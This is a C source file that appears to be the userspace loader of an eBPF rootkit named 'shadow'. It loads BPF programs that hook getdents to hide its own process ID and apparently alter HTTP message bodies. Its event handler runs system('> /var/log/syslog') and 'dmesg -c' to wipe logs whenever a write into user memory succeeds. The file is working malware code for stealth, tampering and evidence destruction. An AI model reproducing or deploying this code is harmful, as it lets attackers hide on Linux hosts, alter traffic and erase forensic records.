#include "shadow.skel.h"
#include "shadow.h"

#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/klog.h>
#include <syslog.h>

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    return vfprintf(stderr, format, args);
}

static volatile sig_atomic_t exiting = 0;

static void sig_handler(int signo)
{
    exiting = 1;
}

static bool setup_sig_handler() 
{
    /* cleaner handling of Ctrl+C */
    if ((signal(SIGINT, sig_handler)) == SIG_ERR) {
        fprintf(stderr, "Can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    if ((signal(SIGTERM, sig_handler)) == SIG_ERR) {
        fprintf(stderr, "Can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    return true;
}

static bool bump_memlock_rlimit()
{
    struct rlimit rlim_new = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };

    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit! (hint: run as root)\n");
        return false;
    }
    return true;
}

static bool setup() 
{
    /* set up libbpf errors and debug info callback */
    libbpf_set_print(libbpf_print_fn);

    /* increase RLIMIT_MEMLOCK to allow bpf sub-system to do anything */
    if (!bump_memlock_rlimit())
        return false;

    /* setup signal handler so we exit cleanly */
    if (!setup_sig_handler())
        return false;

    return true;
}

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    /* nuke syslog and dmesg if we used bpf_probe_write_user to modify msg */
    if (e->success) {
        fprintf(stderr, "Cleaning up syslog + dmesg\n");
        system("> /var/log/syslog"); 
        system("dmesg -c"); 
    }

    return 0;
}

int g_pid;

int main(int argc, char *argv[])
{
    struct shadow_bpf *skel = NULL;
    struct ring_buffer *rb = NULL;
    int err;

    /* do common setup */
    if (!setup())
        exit(EXIT_FAILURE);

    /* open BPF applications */
    skel = shadow_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton: %s\n", strerror(errno));
        goto cleanup;
    }

    char pid_to_hide[MAX_PID_LEN] = { 0 };
    g_pid = getpid();
    sprintf(pid_to_hide, "%d", g_pid);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;

    /* load and verify BPF program */
    err = shadow_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }

    /* add programs to map to be called later */
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.http_find_msg_body_start);
    int ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array_fentry),
        &index, 
        &prog_fd,
        BPF_ANY
    );
    if (ret == -1) {
        fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    /* use separate prog map for tp */
    index = PROG_03;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
    ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array_tp_syscall),
        &index, 
        &prog_fd,
        BPF_ANY
    );
    if (ret == -1) {
        fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    } 
    index = PROG_04;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array_tp_syscall),
        &index, 
        &prog_fd,
        BPF_ANY
    );
    if (ret == -1) {
        fprintf(stderr, "Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    } 
    
    /* attach kprobes */
    err = shadow_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }

    /* setup ring buffer */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer!\n");
        goto cleanup;
    }

    printf("Successfully started!\n"); 
    printf("PID: %d\n", g_pid);

    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl+C causes -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            fprintf(stderr, "Error polling ring buffer: %d\n", err);
            break;
        }
    }

cleanup:
    shadow_bpf__destroy(skel);
    return -err;
}